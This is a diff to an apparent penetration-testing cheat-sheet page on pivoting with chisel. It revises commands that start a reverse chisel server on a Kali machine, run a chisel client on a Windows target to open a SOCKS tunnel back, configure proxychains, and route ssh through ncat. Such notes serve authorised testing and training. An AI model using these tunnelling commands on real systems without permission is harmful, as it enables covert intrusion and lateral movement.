@@ -20,15 +20,15 @@ permalink: /network/chisel/
 ## Exploit
 
 ```bash
-# Start chisel server on your environement
-chisel server --port LPORT --reverse
+# Start chisel server on your Kali.
+chisel server --port $lport --reverse
 
-# Start chisel client on a target
-chisel client $LHOST:$LPORT R:socks
+# Start chisel client on a Windows target.
+chisel.exe client $lhost:$Lport R:socks
 
-# Check SOCKS proxy is up
-ss -ntplu
+# Modify /etc/proxychains4.conf.
+socks5 127.0.0.1 1080
 
-# Create a proxyfied ssh tunnel through the chisel client to your target
-ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$SOCKS_PORT %h %p" $USERNAME@$TARGET
+# Create a proxyfied ssh tunnel through the chisel client to your target.
+ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$socks_port %h %p" $username@$target
 ```
